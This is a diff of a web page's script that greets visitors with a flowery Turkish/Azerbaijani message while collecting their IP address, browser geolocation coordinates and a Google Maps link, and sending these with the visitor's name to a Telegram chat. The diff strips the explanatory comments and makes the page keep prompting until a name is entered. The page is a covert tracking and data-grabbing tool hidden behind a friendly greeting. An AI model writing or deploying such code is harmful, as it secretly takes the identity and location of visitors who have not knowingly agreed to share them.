@@ -51,26 +51,21 @@
 
         document.getElementById('ipDisplay').textContent = `API ünvanın: ${ip}`;
 
-        // İcazə varsa geolokasiya almağa çalışırıq
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             position => {
               const lat = position.coords.latitude.toFixed(5);
               const lon = position.coords.longitude.toFixed(5);
               const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
-
-              // Telegrama mesaj göndərilir (ad, ip, koordinatlar və xəritə linki)
               const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nYer: ${lat}, ${lon}\nXəritə: ${mapUrl}`;
               sendToTelegram(messageText);
             },
             error => {
-              // Əgər geolokasiya alınmasa sadəcə IP göndərilir
               const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nGeolokasiya əldə edilə bilmədi: ${error.message}`;
               sendToTelegram(messageText);
             }
           );
         } else {
-          // Brauzer geolokasiyanı dəstəkləmirsə
           const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nGeolokasiya dəstəklənmir.`;
           sendToTelegram(messageText);
         }
@@ -81,14 +76,14 @@
     }
 
     window.onload = () => {
-      const name = prompt("Zəhmət olmasa adınızı yazın");
-      if (name && name.trim() !== "") {
-        document.getElementById('greeting').textContent = `Salam ${name}!, Gayem zat-ı alinizi taciz etmek değil, efkari umumide muhabbet kurmaktır. Cevabı müspetiniz kalb-i hazı halimi tamir ve temin edeceğinden dest-i muhabbetinize talibim. Zat-ı âlinizin efkâr-ı umumiyeye muhabbetle yaklaşması, benim için de bir şereftir. Eğer dest-i muhabbetime talipseniz, ben de can-ı gönülden bu dostluğa kapılarımı açarım. Buyurun, kelâm sizin, gönül birliğimiz daim olsun.`;
-        getIpAndSend(name);
-      } else {
-        document.getElementById('greeting').textContent = `Salam! Gayem zat-ı alinizi taciz etmek değil, efkari umumide muhabbet kurmaktır. Cevabı müspetiniz kalb-i hazı halimi tamir ve temin edeceğinden dest-i muhabbetinize talibim. Zat-ı âlinizin efkâr-ı umumiyeye muhabbetle yaklaşması, benim için de bir şereftir. Eğer dest-i muhabbetime talipseniz, ben de can-ı gönülden bu dostluğa kapılarımı açarım. Buyurun, kelâm sizin, gönül birliğimiz daim olsun.`;
-        getIpAndSend("Anonim istifadəçi");
+      let name = "";
+      while (!name || name.trim() === "") {
+        name = prompt("Zəhmət olmasa adınızı yazın (mütləqdir)");
       }
+      document.getElementById('greeting').textContent = 
+        `Salam ${name}!, Gayem zat-ı alinizi taciz etmek deyil, efkari umumide muhabbet kurmaktır. 
+         Cevabı müspetiniz kalb-i hazı halimi tamir və temin edeceğinden dest-i muhabbetinize talibim...`;
+      getIpAndSend(name);
     };
   </script>
 </body>
